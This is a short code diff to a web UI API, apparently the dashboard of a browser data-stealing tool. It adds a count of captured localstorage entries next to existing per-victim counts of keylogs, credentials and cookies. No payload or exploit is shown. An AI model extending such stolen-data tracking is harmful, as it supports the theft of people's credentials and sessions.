@@ -32,7 +32,8 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
         (SELECT COUNT(*) FROM clients) as clients,
         (SELECT COUNT(*) FROM keylogs) as keylogs,
         (SELECT COUNT(*) FROM credentials) as credentials,
-        (SELECT COUNT(*) FROM cookies) as cookies
+        (SELECT COUNT(*) FROM cookies) as cookies,
+        (SELECT COUNT(*) FROM localstorage) as localstorage
     `
     );
     res.json({ wakeUpTime: wakeUpTime.getTime(), ...stmt.get() });
@@ -103,7 +104,8 @@ module.exports = function initializeWebUiApi(appWebUI, server) {
         c.*,
         (SELECT COUNT(*) FROM keylogs WHERE client_id = c.client_id) as keylogs,
         (SELECT COUNT(*) FROM credentials WHERE client_id = c.client_id) as credentials,
-        (SELECT COUNT(*) FROM cookies WHERE client_id = c.client_id) as cookies
+        (SELECT COUNT(*) FROM cookies WHERE client_id = c.client_id) as cookies,
+        (SELECT COUNT(*) FROM localstorage WHERE client_id = c.client_id) as localstorage
       FROM clients c
     `);
 
